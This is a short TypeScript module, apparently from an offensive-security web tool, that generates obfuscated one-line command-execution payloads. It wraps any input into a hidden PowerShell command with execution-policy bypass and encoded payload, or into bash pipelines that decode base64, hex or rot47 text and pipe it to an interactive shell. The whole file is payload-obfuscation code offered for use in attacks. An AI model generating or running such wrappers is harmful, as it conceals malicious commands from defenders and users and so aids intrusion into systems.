import { useState } from 'react';
import { powerB64Encode } from './powershell_b64'
import { stringToHex } from './hex'
import { rot47encode } from './rot47'
// 一行命令执行payload

type AllowedTypes = 'powershell_b64' | 'bash_b64' | 'bash_hex' | 'bash_rot';

export function powershell_b64_oneliner(input: string): string {
    return `powershell -exec bypass -WindowStyle Hidden -NoLogo -Noexit -enc ${powerB64Encode(input)}`;
}

export function bash_b64_oneliner(input: string): string {
    return `echo "${btoa(input)}" | base64 -d | bash -i`;
}

export function bash_hex_oneliner(input: string): string {
    return `echo "${stringToHex(input)}" | xxd -r -p | bash -i`;
}

export function bash_rot47_oneliner(input: string): string {
    return `echo "${btoa(rot47encode(input))}" | base64 -d | tr '!-~' 'P-~!-O' | bash -i`;
}

export function oneliner(input: string, type: AllowedTypes): string {
    switch (type) {
        case 'powershell_b64':
            return powershell_b64_oneliner(input);
        case 'bash_b64':
            return bash_b64_oneliner(input);
        case 'bash_hex':
            return bash_hex_oneliner(input);
        case 'bash_rot':
            return bash_rot47_oneliner(input);
    }
}